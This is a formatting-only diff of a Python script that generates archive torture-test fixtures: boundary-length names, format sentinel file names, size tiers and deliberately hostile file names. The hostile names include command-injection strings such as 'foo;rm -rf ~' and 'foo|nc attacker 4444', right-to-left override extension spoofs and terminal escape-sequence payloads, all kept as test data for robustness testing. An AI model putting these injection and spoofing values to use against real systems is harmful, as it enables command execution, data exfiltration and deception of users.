@@ -122,6 +122,7 @@ import sys
 
 # -------- helpers --------
 
+
 def file_entry(name, size=0):
     return {"type": "file", "name": name, "size": size}
 
@@ -172,6 +173,7 @@ def nested_path_of_total_length(total_len, leaf_marker):
 # These test filename bytes, not path bytes. Useful for formats that
 # have a flat name field (cpio, zip's filename field in the LFH/CDR,
 # gnutar's name handling).
+# fmt: off
 LENGTH_BOUNDARY_LEAFS = [
     99, 100, 101,           # ustar name field boundary (100 bytes)
     154, 155, 156,          # ustar prefix field boundary (155 bytes)
@@ -187,6 +189,7 @@ PATH_BOUNDARY_TOTALS = [
     1023, 1024, 1025,       # legacy buffer
     4095, 4096, 4097,       # PATH_MAX on most systems
 ]
+# fmt: on
 # Deliberately skipping 65535+ because fuse-t/NFS won't mount paths
 # that long; testing those requires a direct-crafted archive, not a
 # filesystem mount.
@@ -232,7 +235,6 @@ SENTINEL_NAMES = [
     "PaxHeader",
     # Cpio's end-of-archive marker as a regular filename.
     "TRAILER!!!",
-
     # --- ZIP / JAR / EPUB / OOXML / ODF --------------------------
     # EPUB and ODF require the first file in the zip to be named
     # 'mimetype', uncompressed, no extra fields. A real file literally
@@ -251,7 +253,6 @@ SENTINEL_NAMES = [
     "module-info.class",
     # JPMS multi-release version directory leaf.
     "versions",
-
     # --- XAR / Apple .pkg ---------------------------------------
     # Apple package format. These names have specific meaning inside
     # a .pkg / .xar and many installer tools look them up by name.
@@ -268,7 +269,6 @@ SENTINEL_NAMES = [
     "Postinstall",
     "Preupgrade",
     "Postupgrade",
-
     # --- Debian .deb (ar format) --------------------------------
     # A .deb is an ar archive containing exactly these filenames, in
     # this specific order. dpkg enforces the order and the names.
@@ -281,7 +281,6 @@ SENTINEL_NAMES = [
     "data.tar.zst",
     "_gpgorigin",
     "_gpgbuilder",
-
     # --- OCI / Docker image -------------------------------------
     # Root of a tar-ified OCI image or a docker save tarball.
     # Runtimes that filename-match on these during load get
@@ -292,7 +291,6 @@ SENTINEL_NAMES = [
     "index.json",
     "repositories",
     "layer.tar",
-
     # --- CAB (Microsoft Cabinet) --------------------------------
     # CAB has no format-internal sentinel filenames — the format is
     # purely binary (CFHEADER / CFFOLDER / CFFILE / CFDATA), and
@@ -307,7 +305,6 @@ SENTINEL_NAMES = [
     "Data1.cab",
     "MSI.cab",
     "layout.bin",
-
     # --- Apple sidecar and macOS volume sentinels --------------
     "._normal_file",
     "._",
@@ -315,11 +312,9 @@ SENTINEL_NAMES = [
     ".metadata_never_index",
     ".metadata_never_index_unless_rootfs",
     ".Spotlight-V100",
-
     # --- Windows sentinels --------------------------------------
     "Thumbs.db",
     "desktop.ini",
-
     # --- Windows device-name leftovers (legal POSIX, reserved NT)
     "CON",
     "PRN",
@@ -327,17 +322,14 @@ SENTINEL_NAMES = [
     "NUL",
     "COM1",
     "LPT1",
-
     # --- argv / flag confusion ----------------------------------
     "-rf",
     "--help",
     "-",
-
     # --- shell-expansion-lookalike filenames --------------------
     "$HOME",
     "$(whoami)",
     "`id`",
-
     # --- archive-format magic bytes at start of filename --------
     # Tests format auto-detection in readers that recurse into
     # filenames (some virus scanners do this). Only formats whose
@@ -348,13 +340,12 @@ SENTINEL_NAMES = [
     # two bytes C3 BD, not the raw byte FD, so the resulting filename
     # would not actually start with the intended magic. See the
     # module docstring for the full explanation.
-    "PK\x03\x04fake_zip_magic",          # zip LFH (low ASCII magic)
-    "Rar!\x1a\x07fake_rar4_magic",       # RAR v4 (NUL terminator dropped)
-    "Rar!\x1a\x07\x01fake_rar5_magic",   # RAR v5 differs by last byte
-    "MSCFfake_cab_magic",                # CAB (the 4-byte "MSCF" alone)
-    "xar!fake_xar_magic",                # XAR (the 4-byte "xar!" alone)
-    "BZhfake_bzip2_magic",               # bzip2 ("BZh" ASCII prefix)
-
+    "PK\x03\x04fake_zip_magic",  # zip LFH (low ASCII magic)
+    "Rar!\x1a\x07fake_rar4_magic",  # RAR v4 (NUL terminator dropped)
+    "Rar!\x1a\x07\x01fake_rar5_magic",  # RAR v5 differs by last byte
+    "MSCFfake_cab_magic",  # CAB (the 4-byte "MSCF" alone)
+    "xar!fake_xar_magic",  # XAR (the 4-byte "xar!" alone)
+    "BZhfake_bzip2_magic",  # bzip2 ("BZh" ASCII prefix)
     # --- whitespace / dot trailing ------------------------------
     "trailing_space ",
     "trailing_dot.",
@@ -413,9 +404,7 @@ def build_sentinel_names():
         tree = trees.setdefault(top, {"files": [], "subdirs": {}})
         cur = tree
         for part in sub:
-            cur = cur["subdirs"].setdefault(
-                part, {"files": [], "subdirs": {}}
-            )
+            cur = cur["subdirs"].setdefault(part, {"files": [], "subdirs": {}})
         cur["files"].append(leaf)
 
     def materialize(name, node):
@@ -439,6 +428,7 @@ def build_sentinel_names():
 # is where int32 / uint32 / int64 / ustar-octal overflow bugs live and
 # needs to be run deliberately.
 
+# fmt: off
 SIZE_TIERS = [
     (
         "04_size_boundaries_small_FAST",
@@ -474,6 +464,7 @@ SIZE_TIERS = [
         ],
     ),
 ]
+# fmt: on
 
 
 def build_size_boundaries(tier):
@@ -543,7 +534,7 @@ def build_evil_filenames():
         "`whoami`",
         "foo;rm -rf ~",
         "foo|nc attacker 4444",
-        "foo>etc_passwd",    # literal `>`, not redirect (redirect needs real /)
+        "foo>etc_passwd",  # literal `>`, not redirect (redirect needs real /)
         "foo&bar",
         "${PATH}",
         "$HOME",
@@ -570,12 +561,12 @@ def build_evil_filenames():
     # confusable way. The canonical "innocentexe.pdf" attack, plus
     # variations with LRO, isolates, and embeddings.
     for name in [
-        "innocent\u202etxt.exe",           # RLO: displays "innocentexe.txt"
-        "report\u202efdp.exe",             # displays "reportexe.pdf"
-        "doc\u202dltr_override.pdf",       # LRO
-        "mix\u202arle_embed.txt",          # RLE (deprecated)
+        "innocent\u202etxt.exe",  # RLO: displays "innocentexe.txt"
+        "report\u202efdp.exe",  # displays "reportexe.pdf"
+        "doc\u202dltr_override.pdf",  # LRO
+        "mix\u202arle_embed.txt",  # RLE (deprecated)
         "iso\u2066first_strong\u2069end",  # FSI / PDI
-        "iso\u2067rli_isolate\u2069end",   # RLI / PDI
+        "iso\u2067rli_isolate\u2069end",  # RLI / PDI
     ]:
         entries.append(file_entry(name))
 
@@ -589,15 +580,15 @@ def build_evil_filenames():
     BEL = "\u0007"
     BS = "\u0008"
     for name in [
-        f"title{ESC}]0;HACKED{BEL}.txt",              # OSC 0 title setter
-        f"clear{ESC}[2J{ESC}[H.txt",                  # CSI clear + home
+        f"title{ESC}]0;HACKED{BEL}.txt",  # OSC 0 title setter
+        f"clear{ESC}[2J{ESC}[H.txt",  # CSI clear + home
         # OSC 8 hyperlink — URL can't contain '/' (FUSE rejects), so
         # use a scheme-only marker as the target. Still exercises the
         # OSC 8 parser in terminals.
         f"link{ESC}]8;;evil:link{BEL}click{ESC}]8;;{BEL}.txt",
-        f"color{ESC}[31;1mRED{ESC}[0m.txt",           # SGR red bold
-        f"backspace{BS}{BS}{BS}{BS}evil.txt",         # backspaces over output
-        f"hide{ESC}[8m_hidden_{ESC}[28m.txt",         # conceal attribute
+        f"color{ESC}[31;1mRED{ESC}[0m.txt",  # SGR red bold
+        f"backspace{BS}{BS}{BS}{BS}evil.txt",  # backspaces over output
+        f"hide{ESC}[8m_hidden_{ESC}[28m.txt",  # conceal attribute
         # DECSC / DECRC save/restore cursor — abused for overwrite tricks
         f"savecur{ESC}7evil{ESC}8.txt",
     ]:
@@ -627,13 +618,13 @@ def build_evil_filenames():
     # (APFS is NFD) and tar round-trips to one that doesn't (ext4 is
     # byte-literal), data gets silently lost or duplicated.
     for name in [
-        "caf\u00e9_nfc",         # precomposed é, NFC form
-        "cafe\u0301_nfd",        # e + combining acute, NFD form
-        "\u00e9",                # lone precomposed é
-        "e\u0301",               # lone decomposed é
+        "caf\u00e9_nfc",  # precomposed é, NFC form
+        "cafe\u0301_nfd",  # e + combining acute, NFD form
+        "\u00e9",  # lone precomposed é
+        "e\u0301",  # lone decomposed é
         # Korean Hangul: single syllable vs Jamo decomposition
-        "hangul_\uac00_syllable",      # 가 as single codepoint
-        "hangul_\u1100\u1161_jamo",    # ㄱ + ㅏ = same visual 가
+        "hangul_\uac00_syllable",  # 가 as single codepoint
+        "hangul_\u1100\u1161_jamo",  # ㄱ + ㅏ = same visual 가
     ]:
         entries.append(file_entry(name))
 
@@ -642,12 +633,12 @@ def build_evil_filenames():
     # tool that uses NFKC for comparison (some URL canonicalisers, some
     # filename matchers, HTTP header parsing).
     for name in [
-        "file\uff11.txt",        # fullwidth digit 1
-        "file1.txt",             # ASCII 1 — same NFKC form
-        "file\uff41.txt",        # fullwidth 'a'
-        "filea.txt",             # ASCII 'a' — same NFKC form
-        "file\u2168.txt",        # Roman numeral IX
-        "fileIX.txt",            # ASCII IX — same NFKC form
+        "file\uff11.txt",  # fullwidth digit 1
+        "file1.txt",  # ASCII 1 — same NFKC form
+        "file\uff41.txt",  # fullwidth 'a'
+        "filea.txt",  # ASCII 'a' — same NFKC form
+        "file\u2168.txt",  # Roman numeral IX
+        "fileIX.txt",  # ASCII IX — same NFKC form
     ]:
         entries.append(file_entry(name))
 
@@ -754,11 +745,11 @@ def build_evil_filenames():
     # differ in invisible characters break filename-based deduplication
     # and access-control rules.
     for name in [
-        "zerowidth_a\u200bzero_width_space",     # U+200B ZWSP
-        "zerowidth_b\u200czero_width_nonjoin",   # U+200C ZWNJ
-        "zerowidth_c\u200dzero_width_join",      # U+200D ZWJ
-        "zerowidth_d\ufeffzero_width_nbsp",      # U+FEFF BOM / ZWNBSP
-        "zerowidth_e\u180ezero_width_mvs",       # U+180E Mongolian vowel sep
+        "zerowidth_a\u200bzero_width_space",  # U+200B ZWSP
+        "zerowidth_b\u200czero_width_nonjoin",  # U+200C ZWNJ
+        "zerowidth_c\u200dzero_width_join",  # U+200D ZWJ
+        "zerowidth_d\ufeffzero_width_nbsp",  # U+FEFF BOM / ZWNBSP
+        "zerowidth_e\u180ezero_width_mvs",  # U+180E Mongolian vowel sep
     ]:
         entries.append(file_entry(name))
 
@@ -766,10 +757,7 @@ def build_evil_filenames():
     # silently filtered by FUSE at mount time. The category sources
     # above are already free of these, but the filter guards against
     # accidental reintroduction.
-    entries = [
-        e for e in entries
-        if "/" not in e["name"] and "\u0000" not in e["name"]
-    ]
+    entries = [e for e in entries if "/" not in e["name"] and "\u0000" not in e["name"]]
 
     return dir_entry("07_evil_filenames", entries)
 
@@ -920,13 +908,12 @@ def main():
         "--output-dir",
         default=os.path.dirname(os.path.abspath(__file__)),
         help="Directory to write the archive_torture_*.json files into "
-             "(default: this script's directory).",
+        "(default: this script's directory).",
     )
     args = parser.parse_args()
 
     if not os.path.isdir(args.output_dir):
-        print(f"error: output dir does not exist: {args.output_dir}",
-              file=sys.stderr)
+        print(f"error: output dir does not exist: {args.output_dir}", file=sys.stderr)
         sys.exit(2)
 
     for suffix, builder in BUILDERS.items():
